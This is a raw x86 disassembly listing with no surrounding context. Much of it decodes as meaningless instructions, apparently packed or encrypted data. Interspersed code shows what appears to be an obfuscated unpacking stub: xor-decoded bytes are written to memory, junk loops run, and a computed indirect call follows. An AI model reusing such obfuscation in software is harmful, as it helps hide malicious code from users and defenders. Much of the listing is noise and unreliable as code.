  407360:	loope  0x40736e
  407362:	adc    al,0x18
  407364:	sbb    ecx,esi
  407366:	jp     0x40739a
  407368:	dec    edi
  407369:	xchg   ebp,eax
  40736a:	mov    WORD PTR [ebp+0x7f],ds
  40736d:	imul   BYTE PTR cs:[edx-0x143f3c1a]
  407374:	dec    esi
  407375:	ror    DWORD PTR [esi],cl
  407377:	(bad)  
  407378:	sti    
  407379:	xor    al,0x1f
  40737b:	retf   0xc660
  40737e:	imul   edi,eax,0x67c3569a
  407384:	cwde   
  407385:	push   ds
  407386:	cs call 0xdf82:0xc1ca93e
  40738e:	in     al,0x93
  407390:	mov    eax,DWORD PTR [eax+0x198]
  407396:	push   DWORD PTR [eax]
  407398:	call   0x40d076
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	stc    
  4073e0:	jmp    0x40738e
  4073e2:	fisubr DWORD PTR [ebx+0x207070c1]
  4073e8:	jge    0x40745a
  4073ea:	jo     0x40742b
  4073ec:	popf   
  4073ed:	add    BYTE PTR [ebp+0x4a],ch
  4073f0:	and    ebx,DWORD PTR [edx-0x2]
  4073f3:	jns    0x4073d5
  4073f5:	pop    DWORD PTR [ebp+0x717820e1]
  4073fb:	ror    DWORD PTR [eax-0x27e7a697],cl
  407401:	repnz sbb BYTE PTR [ebp+0x5a],ah
  407405:	push   esp
  407406:	das    
  407407:	cdq    
  407408:	ffreep st(2)
  40740a:	leave  
  40740b:	mov    ds:0x56216880,al
  407410:	clc    
  407411:	xlat   BYTE PTR ds:[ebx]
  407412:	xchg   esi,eax
  407413:	push   edi
  407414:	mov    ?,WORD PTR [bp+si]
  407417:	mov    ch,0x7
  407419:	xor    BYTE PTR [edi-0x59604fcc],bl
  40741f:	stc    
  407420:	push   ebx
  407421:	aas    
  407422:	mov    DWORD PTR [ebx],0xcfdcac3f
  407428:	in     al,dx
  407429:	sbb    cl,0x32
  40742c:	dec    edi
  40742d:	outs   dx,BYTE PTR ds:[esi]
  40742e:	dec    edx
  40742f:	inc    eax
  407430:	ror    BYTE PTR [ebp*2-0x7054927d],cl
  407437:	add    BYTE PTR [edi+0x8],bl
  40743a:	sbb    DWORD PTR [ecx+0x7e],edi
  40743d:	or     DWORD PTR [edx+eax*4],0xffffff91
  407441:	xor    esp,edi
  407443:	mov    ebx,0xd2b1e14
  407448:	cmp    eax,0xed2e8b6d
  40744d:	in     eax,dx
  40744e:	mov    dl,0xf0
  407450:	mov    ebx,0x98c119d3
  407455:	outs   dx,DWORD PTR ds:[esi]
  407456:	jle    0x407455
  407458:	jle    0x407463
  40745a:	jmp    0x4074c0
  40745c:	adc    eax,0x6d7931bf
  407461:	pop    es
  407462:	push   ebp
  407463:	jmp    0x407486
  407465:	sub    al,BYTE PTR [edi+0x1736b54b]
  40746b:	hlt    
  40746c:	and    al,0xf9
  40746e:	dec    edi
  40746f:	in     eax,dx
  407470:	mov    ds:0xd807055d,eax
  407475:	es xchg ecx,eax
  407477:	xchg   ecx,eax
  407478:	ret    0x91de
  40747b:	push   ebx
  40747c:	push   esi
  40747d:	out    dx,eax
  40747e:	sub    bl,al
  407480:	adc    BYTE PTR cs:[ebx+0x32],cl
  407484:	mov    ds:0x42485083,al
  407489:	or     ch,BYTE PTR [bx+si-0x3748]
  40748e:	movzx  edx,BYTE PTR [eax]
  407491:	ret    0xa398
  407494:	js     0x407476
  407496:	aaa    
  407497:	imul   ecx,ecx,0x5d
  40749a:	(bad)  
  40749b:	int3   
  40749c:	xchg   DWORD PTR [ebp-0x29e5ceaf],ebx
  4074a2:	ss out dx,eax
  4074a4:	retf   0xd591
  4074a7:	push   edx
  4074a8:	add    cl,cl
  4074aa:	fwait
  4074ab:	or     eax,0x514a60d0
  4074b0:	loope  0x407460
  4074b2:	mov    gs,esi
  4074b4:	push   edi
  4074b5:	pop    es
  4074b6:	xchg   edx,eax
  4074b7:	jge    0x4074b2
  4074b9:	cld    
  4074ba:	int    0xd9
  4074bc:	ds jge 0x4074dc
  4074bf:	in     al,0x71
  4074c1:	fs mov dh,0x99
  4074c4:	inc    esi
  4074c5:	or     dh,bl
  4074c7:	stos   DWORD PTR es:[edi],eax
  4074c8:	xchg   DWORD PTR [edx+0x564b14fd],ebp
  4074ce:	aad    0x6f
  4074d0:	xchg   DWORD PTR [edi],esi
  4074d2:	jmp    0xd561:0x25e48f99
  4074d9:	jae    0x40748b
  4074db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074dc:	in     al,dx
  4074dd:	cmp    DWORD PTR [esi-0x10e4ce94],esp
  4074e3:	mov    bl,0x81
  4074e5:	out    0xc4,eax
  4074e7:	push   ebp
  4074e8:	sbb    eax,0x6660e66b
  4074ed:	lar    ecx,WORD PTR [ecx+edi*1+0x410a2ae5]
  4074f5:	scas   eax,DWORD PTR es:[edi]
  4074f6:	jmp    0x71e4a35
  4074fb:	pop    ebp
  4074fc:	cmp    al,0xf1
  4074fe:	out    0x14,al
  407500:	push   esp
  407501:	scas   eax,DWORD PTR es:[edi]
  407502:	enter  0x3cce,0x97
  407506:	aad    0x10
  407508:	cmp    dl,cl
  40750a:	rcr    DWORD PTR [eax],1
  40750c:	pop    esi
  40750d:	imul   esi,esp,0xd61c3537
  407513:	das    
  407514:	xor    ebx,DWORD PTR [ebx-0x31]
  407517:	pushf  
  407518:	test   DWORD PTR [edx-0x1affe933],ebx
  40751e:	cmp    edx,DWORD PTR [esi+0x37]
  407521:	push   ebp
  407522:	cmp    ebp,edx
  407524:	add    BYTE PTR [ebx+0x22],ah
  407527:	mov    cl,bl
  407529:	or     dl,al
  40752b:	test   esp,esi
  40752d:	push   edi
  40752e:	xor    BYTE PTR [edx],dl
  407530:	push   ebp
  407531:	lahf   
  407532:	enter  0x5fa2,0x43
  407536:	dec    edx
  407537:	cmp    ecx,DWORD PTR [edi+0x6fc79eeb]
  40753d:	repnz mov cl,0x64
  407540:	loope  0x4074cb
  407542:	lock loope 0x40759d
  407545:	fnsave [edi]
  407547:	lods   al,BYTE PTR ds:[esi]
  407548:	inc    eax
  407549:	pop    ss
  40754a:	jne    0x40757a
  40754c:	ret    
  40754d:	jmp    DWORD PTR [edx-0xb]
  407550:	push   es
  407551:	add    DWORD PTR [edx+eax*2+0x5c5ed2fc],esi
  407558:	shl    DWORD PTR [ecx],1
  40755a:	rol    BYTE PTR [esi-0x55844512],0x70
  407561:	pop    ds
  407562:	mov    ebx,0x42c617f
  407567:	xchg   ebp,eax
  407568:	add    BYTE PTR [ebp+0x42],al
  40756b:	mov    edi,0x339a8ab7
  407570:	stos   BYTE PTR es:[edi],al
  407571:	je     0x4075a8
  407573:	dec    edi
  407574:	adc    BYTE PTR [eax],cl
  407576:	inc    ecx
  407577:	adc    DWORD PTR [edi+0x58],0xa2209cc4
  40757e:	repz jp 0x40751c
  407581:	pusha  
  407582:	test   al,0x5a
  407584:	xchg   esp,eax
  407585:	mov    edx,0xe0bbf0ef
  40758a:	pusha  
  40758b:	jo     0x407535
  40758d:	mov    al,ds:0x38d4b5ea
  407592:	fld    QWORD PTR [eax+eax*4-0x4273e550]
  407599:	test   al,0x11
  40759b:	inc    edi
  40759c:	(bad)  
  40759d:	cli    
  40759e:	mov    bl,BYTE PTR [edx-0x26a23693]
  4075a4:	mov    ebp,0xc0f57092
  4075a9:	neg    DWORD PTR [eax+0x33]
  4075ac:	pop    ds
  4075ad:	test   DWORD PTR [edx+0x506fe5d1],0x390c85b1
  4075b7:	xor    cl,BYTE PTR [ecx]
  4075b9:	push   cs
  4075ba:	mov    al,ds:0xf98fe3e7
  4075bf:	jmp    0x513:0x1be11170
  4075c6:	mov    dh,dh
  4075c8:	push   eax
  4075c9:	fst    QWORD PTR [esi+0xa6f06e8]
  4075cf:	xor    al,0xf3
  4075d1:	cmc    
  4075d2:	or     DWORD PTR [ebx+0x3266d4f6],esi
  4075d8:	mov    esp,ebx
  4075da:	lock imul ecx,eax,0x12
  4075de:	sbb    DWORD PTR [ebp-0x4da90889],0xffffff86
  4075e5:	stos   DWORD PTR es:[edi],eax
  4075e6:	hlt    
  4075e7:	daa    
  4075e8:	dec    ecx
  4075e9:	dec    edi
  4075ea:	cdq    
  4075eb:	aad    0x95
  4075ed:	std    
  4075ee:	mov    dl,0x24
  4075f0:	retf   
  4075f1:	fcmovnu st,st(2)
  4075f3:	jb     0x40758c
  4075f5:	enter  0x5e5,0x51
  4075f9:	fild   QWORD PTR [eax+0x55bdf818]
  4075ff:	ss fcmove st,st(0)
  407602:	popf   
  407603:	int3   
  407604:	and    dh,ah
  407606:	push   ds
  407607:	mov    eax,0x90a8c6a5
  40760c:	inc    eax
  40760d:	mov    ah,0x58
  40760f:	jno    0x4075da
  407611:	pop    ebp
  407612:	std    
  407613:	lods   eax,DWORD PTR ds:[esi]
  407614:	mov    WORD PTR [edi+eiz*8],ss
  407617:	jmp    0x910f:0x1e4ada8c
  40761e:	loope  0x4075aa
  407620:	inc    eax
  407621:	mov    ds:0x49736545,eax
  407626:	lods   eax,DWORD PTR ds:[esi]
  407627:	repnz push esi
  407629:	adc    al,0x71
  40762b:	sub    BYTE PTR [edi+0x6162b81b],dl
  407631:	pop    esi
  407632:	(bad)  [ebx+0x4d1ea427]
  407638:	aam    0xec
  40763a:	pusha  
  40763b:	jle    0x4075fc
  40763d:	(bad)  
  40763e:	xlat   BYTE PTR ds:[ebx]
  40763f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407640:	popa   
  407641:	or     eax,0xbb192a4a
  407646:	pop    ecx
  407647:	mov    esi,0xa5cb5efb
  40764c:	jne    0x407654
  40764e:	ret    
  40764f:	dec    edx
  407650:	inc    ebx
  407651:	dec    edi
  407652:	cwde   
  407653:	adc    edx,eax
  407655:	sbb    esp,DWORD PTR [ebx-0x4]
  407658:	dec    ecx
  407659:	in     al,0x7e
  40765b:	adc    DWORD PTR [ecx],esp
  40765d:	cmp    ebx,edx
  40765f:	stos   BYTE PTR es:[edi],al
  407660:	into   
  407661:	or     eax,0x1c1b1128
  407666:	push   0x282a80ec
  40766b:	retf   
  40766c:	pop    esp
  40766d:	inc    eax
  40766e:	and    eax,0xa53160e2
  407673:	(bad)  
  407675:	mov    bl,0x83
  407677:	stos   DWORD PTR es:[edi],eax
  407678:	imul   DWORD PTR [edi+0x66]
  40767b:	sti    
  40767c:	add    BYTE PTR [edx],dh
  40767e:	jns    0x40761a
  407680:	cmp    DWORD PTR [ebx],edi
  407682:	jge    0x40765a
  407684:	jecxz  0x4076dd
  407686:	xor    al,0xa6
  407688:	dec    esp
  407689:	inc    ebx
  40768a:	and    eax,0x67e0f9d4
  40768f:	add    DWORD PTR [edi+0x4e],ebx
  407692:	lods   eax,DWORD PTR ds:[esi]
  407693:	mov    ds:0xf2b9f463,eax
  407698:	sbb    al,0x1a
  40769a:	iret   
  40769b:	fcomip st,st(3)
  40769d:	out    0xc0,al
  40769f:	daa    
  4076a0:	dec    ebx
  4076a1:	pusha  
  4076a2:	out    dx,al
  4076a3:	test   DWORD PTR [esi+0x6b],eax
  4076a6:	test   al,0x3e
  4076a8:	sbb    al,0xca
  4076aa:	dec    edi
  4076ab:	scas   al,BYTE PTR es:[edi]
  4076ac:	add    ebp,DWORD PTR [ebp-0x60f99b0a]
  4076b2:	push   edx
  4076b3:	lock mov edi,?
  4076b6:	pop    ecx
  4076b7:	jl     0x4076bf
  4076b9:	jmp    0xe75c:0x19a7763e
  4076c0:	add    al,0x3
  4076c2:	stos   BYTE PTR es:[edi],al
  4076c3:	(bad)  
  4076c4:	sbb    al,dh
  4076c6:	cmc    
  4076c7:	pop    edi
  4076c8:	(bad)  
  4076ca:	xor    DWORD PTR [edx+0x1a48a092],edx
  4076d0:	adc    DWORD PTR [esi+0x4a],ecx
  4076d3:	jbe    0x407679
  4076d5:	or     eax,esi
  4076d7:	test   al,0x27
  4076d9:	sub    al,0xf0
  4076db:	std    
  4076dc:	push   eax
  4076dd:	xchg   esi,eax
  4076de:	scas   al,BYTE PTR es:[edi]
  4076df:	icebp  
  4076e0:	das    
  4076e1:	dec    ebx
  4076e2:	push   es
  4076e3:	data16 sar bl,0x92
  4076e7:	add    dl,ah
  4076e9:	loopne 0x4076fa
  4076eb:	sbb    esp,DWORD PTR [eax+eax*4-0x1aef9207]
  4076f2:	test   DWORD PTR [edx+0x71],esp
  4076f5:	push   edi
  4076f6:	or     BYTE PTR [ebp+0x3c1ad24c],cl
  4076fc:	xor    DWORD PTR [ebx+0x5346eb47],edi
  407702:	outs   dx,DWORD PTR ds:[esi]
  407703:	and    BYTE PTR [ebx],al
  407705:	add    ebx,DWORD PTR [ebx+0x65489e6d]
  40770b:	stos   BYTE PTR es:[edi],al
  40770c:	jmp    0xe4f5:0xdb28d315
  407713:	sbb    eax,0x4c088cca
  407718:	je     0x4076f9
  40771a:	sar    esi,1
  40771c:	or     bh,bh
  40771e:	jne    0x407710
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434419,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432e64
  40777b:	mov    edi,DWORD PTR ds:0x434449
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432de6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434366
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4326ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4326ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4326ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4326ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434421
  4077dc:	call   DWORD PTR ds:0x4329ca
  4077e2:	cmp    DWORD PTR ds:0x4326ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4326ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4326ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4326ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432dde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43436e
  40782a:	or     DWORD PTR ds:0x4326fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434415,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432700,0x434392
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4326ec
  407850:	or     edi,DWORD PTR ds:0x4326f0
  407856:	mov    DWORD PTR ds:0x4326ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434425,0x1e
  407871:	cmp    DWORD PTR ds:0x434425,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434425,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432cf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434425
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434425,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4343a6
  4078ab:	mov    edi,DWORD PTR ds:0x434469
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	jle    0x40785d
  4078c9:	dec    esi
  4078ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078cb:	pop    ebx
  4078cc:	into   
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x1f444370
  4078d6:	lods   al,BYTE PTR ds:[esi]
  4078d7:	add    ah,dl
  4078d9:	retf   0x3063
  4078dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078dd:	dec    edi
  4078de:	nop
  4078df:	push   esi
  4078e0:	pop    ss
  4078e1:	push   edx
  4078e2:	fyl2xp1 
  4078e4:	cdq    
  4078e5:	mul    BYTE PTR [ecx-0x37]
  4078e8:	mov    DWORD PTR [edx+0x35],0xbf5ebde6
  4078ef:	mov    esp,0xcbf450eb
  4078f4:	repnz imul edi,DWORD PTR [eax+ecx*2+0x30],0x889c2358
  4078fd:	mov    edx,0xccaaf939
  407902:	push   ss
  407903:	test   eax,0xd7f5f6e0
  407908:	test   eax,0x25f870fc
  40790d:	inc    esp
  40790e:	pop    ebp
  40790f:	mov    ah,0x4b
  407911:	les    edx,FWORD PTR [ecx]
  407913:	out    0xf7,al
  407915:	sbb    edi,esp
  407917:	pop    esp
  407918:	dec    ebx
  407919:	dec    ecx
  40791a:	fst    DWORD PTR [ebp+ecx*1+0x5cde4d24]
  407921:	push   ecx
  407922:	ret    0x4bbb
  407925:	xor    ecx,DWORD PTR [ebx-0x69]
  407928:	inc    esp
  407929:	mov    ebx,0x4ec2828a
  40792e:	pop    ecx
  40792f:	jmp    0xdfc2:0xb3d2019c
  407936:	inc    ecx
  407937:	stc    
  407938:	dec    BYTE PTR [edi+ebx*8+0x1cb4a656]
  40793f:	pop    edx
  407940:	mov    dl,BYTE PTR [ecx]
  407942:	dec    esi
  407943:	adc    eax,0x93a02fc5
  407948:	xchg   edx,eax
  407949:	or     eax,0x1de96423
  40794e:	popf   
  40794f:	rcr    DWORD PTR [edi-0x23],cl
  407952:	test   DWORD PTR [ebp+eiz*8-0x7ee14221],edx
  407959:	xchg   ecx,eax
  40795a:	push   0xffffffea
  40795c:	repnz cmc 
  40795e:	xor    eax,0xa539ce53
  407963:	ins    DWORD PTR es:[edi],dx
  407964:	mov    dh,BYTE PTR [edx+0x19]
  407967:	sub    dh,BYTE PTR [edx-0x339b1070]
  40796d:	xchg   esp,eax
  40796e:	adc    ch,bh
  407970:	out    dx,al
  407971:	xchg   ebp,eax
  407972:	pushf  
  407973:	mov    ah,0xb1
  407975:	cmp    bl,BYTE PTR [ebx-0x15]
  407978:	adc    al,bl
  40797a:	aas    
  40797b:	xchg   esi,eax
  40797c:	or     dl,BYTE PTR [ebx+0x4e]
  40797f:	or     eax,0xdb79cfea
  407984:	push   eax
  407985:	cs pusha 
  407987:	jnp    0x40793e
  407989:	jl     0x4079cb
  40798b:	(bad)  
  40798d:	ins    BYTE PTR es:[edi],dx
  40798e:	call   0x92e831aa
  407993:	cdq    
  407994:	std    
  407995:	mov    es,esi
  407997:	fisub  WORD PTR [ebx]
  407999:	pop    esp
  40799a:	mov    edx,0xa00d8d96
  40799f:	aas    
  4079a0:	lahf   
  4079a1:	scas   eax,DWORD PTR es:[edi]
  4079a2:	shr    BYTE PTR [edi+0x20],cl
  4079a5:	adc    al,0x2
  4079a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a8:	fist   WORD PTR ds:0x4619d78
  4079ae:	dec    edx
  4079af:	sbb    DWORD PTR [eax+0x315027cc],edi
  4079b5:	sahf   
  4079b6:	mov    esp,ebx
  4079b8:	mov    ebp,0x5a070e28
  4079bd:	dec    eax
  4079be:	clc    
  4079bf:	dec    ebp
  4079c0:	sub    al,0xa6
  4079c2:	ss pop edi
  4079c4:	sub    BYTE PTR [ecx+0x30013c7e],ch
  4079ca:	in     eax,dx
  4079cb:	aam    0xd0
  4079cd:	or     BYTE PTR [ebx+0x1eb5a938],dh
  4079d3:	dec    esi
  4079d4:	xchg   ecx,eax
  4079d5:	add    DWORD PTR [ecx-0x1447d3ee],eax
  4079db:	call   0xa65325fa
  4079e0:	ret    
  4079e1:	cmp    edi,0x46
  4079e4:	dec    esi
  4079e5:	rol    DWORD PTR [eax],0x21
  4079e8:	in     al,dx
  4079e9:	add    eax,0x66e76b24
  4079ee:	addr16 sbb ebx,DWORD PTR [bx+di+0x5650]
  4079f4:	cmp    DWORD PTR ds:0xd31ea2bf,esp
  4079fa:	dec    edx
  4079fb:	jbe    0x4079c1
  4079fd:	add    BYTE PTR [ebx+eiz*1-0x28],0x96
  407a02:	jle    0x4079ac
  407a04:	repnz xor esp,ecx
  407a07:	loopne 0x407a0f
  407a09:	cmp    bh,BYTE PTR ds:0x4d99caf
  407a0f:	ins    DWORD PTR es:[edi],dx
  407a10:	sbb    ch,dh
  407a12:	mov    bl,0xd3
  407a14:	fdiv   DWORD PTR [esi+0x7dbe2492]
  407a1a:	sub    BYTE PTR [esi-0x5161f66c],al
  407a20:	cmp    al,0x70
  407a22:	cmp    edx,DWORD PTR [ecx]
  407a24:	pop    eax
  407a25:	das    
  407a26:	fmul   QWORD PTR [edx+0x73]
  407a29:	push   esp
  407a2a:	adc    edx,edi
  407a2c:	jl     0x4079dc
  407a2e:	push   esp
  407a2f:	sbb    al,0xdf
  407a31:	ins    BYTE PTR es:[edi],dx
  407a32:	add    eax,0x5ad912e0
  407a37:	cld    
  407a38:	stos   BYTE PTR es:[edi],al
  407a39:	iret   
  407a3a:	lea    esi,[ebp+0x4499c48e]
  407a40:	cs push edx
  407a42:	mov    ebx,0x5b280676
  407a47:	aam    0xb2
  407a49:	dec    ebx
  407a4a:	lahf   
  407a4b:	in     eax,0xc9
  407a4d:	xor    bl,bl
  407a4f:	popf   
  407a50:	sbb    ch,BYTE PTR [esi]
  407a52:	aam    0x6a
  407a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a55:	pushf  
  407a56:	push   esi
  407a57:	or     al,BYTE PTR [edx+0x66f2967f]
  407a5d:	ins    DWORD PTR es:[edi],dx
  407a5e:	xor    al,0xf7
  407a60:	stc    
  407a61:	mov    ebp,0xc68de27c
  407a66:	(bad)  
  407a67:	cld    
  407a68:	cmp    eax,0xd5463f4a
  407a6d:	fs aad 0x98
  407a70:	lahf   
  407a71:	mov    esp,0xc7cdeecd
  407a77:	sub    eax,0xb33f6ab0
  407a7c:	cld    
  407a7d:	inc    edx
  407a7e:	stc    
  407a7f:	int3   
  407a80:	ret    0xf961
  407a83:	test   DWORD PTR [eax-0x401d7909],0x4e7cfac8
  407a8d:	mov    DWORD PTR [eax],eax
  407a8f:	mov    bl,0x35
  407a91:	and    BYTE PTR [eax-0x76],bh
  407a94:	mov    dl,0x47
  407a96:	push   edx
  407a97:	lods   eax,DWORD PTR ds:[esi]
  407a98:	mov    ah,0x4f
  407a9a:	in     eax,dx
  407a9b:	loopne 0x407a2f
  407a9d:	mov    bl,ah
  407a9f:	shl    BYTE PTR [ecx+0x9abac6d],0xe
  407aa6:	(bad)  
  407aa7:	jne    0x407a9d
  407aa9:	repz or eax,0x45a67101
  407aaf:	fisttp WORD PTR [edi+0x72]
  407ab2:	(bad)  
  407ab3:	fist   DWORD PTR ds:0xb4f5dd49
  407ab9:	xor    ecx,DWORD PTR [esi+eax*2+0x256a96af]
  407ac0:	rol    BYTE PTR [ecx],cl
  407ac2:	in     eax,0xef
  407ac4:	sub    BYTE PTR [esi+0x5],bh
  407ac7:	push   ebp
  407ac8:	daa    
  407ac9:	xor    bh,al
  407acb:	inc    ebp
  407acc:	fdiv   DWORD PTR [ebx]
  407ace:	test   DWORD PTR [eax+edi*8+0x2dce1503],ebx
  407ad5:	inc    ebx
  407ad6:	add    bh,al
  407ad8:	inc    ebp
  407ad9:	aam    0x32
  407adb:	test   DWORD PTR [eax+edi*8+0x436a3d8b],ebx
  407ae2:	inc    ebx
  407ae3:	add    BYTE PTR [ecx],ch
  407ae5:	cmp    eax,0x434372
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434425,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi-0x58714807]
  407b18:	pop    ss
  407b19:	dec    eax
  407b1a:	push   esp
  407b1b:	int3   
  407b1c:	jo     0x407b8e
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0x7e0fdb70
  407b25:	mov    edi,0xc659f8f0
  407b2a:	xchg   esp,eax
  407b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b2c:	inc    esp
  407b2d:	jbe    0x407ab4
  407b2f:	jmp    0x407b39
  407b31:	cwde   
  407b32:	mov    eax,0x904261ae
  407b37:	xor    eax,0x214a987
  407b3c:	or     ax,0x407e
  407b40:	jmp    0x407b5b
  407b42:	fdivp  st(0),st
  407b44:	fisttp QWORD PTR [edi]
  407b46:	call   0x27cc4848
  407b4b:	repz pop edx
  407b4d:	pop    eax
  407b4e:	lock add edi,edx
  407b51:	mov    eax,0xc5444a18
  407b56:	sub    BYTE PTR [eax-0x2cc43129],cl
  407b5c:	xor    al,0x8b
  407b5e:	sub    eax,0xae45c43b
  407b63:	sbb    BYTE PTR [ebx-0x7e],0x8c
  407b67:	sbb    al,0x2a
  407b69:	scas   eax,DWORD PTR es:[edi]
  407b6a:	xor    al,0x0
  407b6c:	clc    
  407b6d:	mov    dh,0xbf
  407b6f:	cmp    DWORD PTR [ecx+0x59d33052],edi
  407b75:	in     eax,dx
  407b76:	mov    ds:0x398e9188,eax
  407b7b:	aaa    
  407b7c:	xchg   esp,eax
  407b7d:	mul    BYTE PTR [ebx+ebx*2-0xe]
  407b81:	push   0xb1c46caa
  407b86:	je     0x407b89
  407b88:	sub    DWORD PTR [edx+0x30b657de],edi
  407b8e:	(bad)  
  407b8f:	xchg   edi,eax
  407b90:	mov    al,0xde
  407b92:	fistp  WORD PTR ds:0x9786b2b5
  407b98:	sbb    eax,0xa1e08d64
  407b9d:	sub    DWORD PTR [eax-0x296ca807],0xffffffa1
  407ba4:	mov    edi,DWORD PTR [edi+edx*1-0x7e2485f8]
  407bab:	cwde   
  407bac:	jmp    0x50570903
  407bb1:	inc    eax
  407bb2:	sub    ecx,DWORD PTR [eax]
  407bb4:	dec    ecx
  407bb5:	xchg   esi,eax
  407bb6:	sub    ecx,0x4e3c1725
  407bbc:	jbe    0x407c0c
  407bbe:	into   
  407bbf:	lock mov DWORD PTR [ebp-0x5d],edx
  407bc3:	mov    edi,0x8739d018
  407bc8:	mov    ch,0xe9
  407bca:	push   0x6d
  407bcc:	das    
  407bcd:	mov    dl,0x8
  407bcf:	(bad)  [ecx+0x14]
  407bd2:	ins    BYTE PTR es:[edi],dx
  407bd3:	pop    esi
  407bd4:	mov    ebx,DWORD PTR [ebx-0x5f]
  407bd7:	js     0x407c48
  407bd9:	dec    ebp
  407bda:	scas   eax,DWORD PTR es:[edi]
  407bdb:	sub    al,0x8
  407bdd:	mov    al,0xb5
  407bdf:	mov    al,0x7e
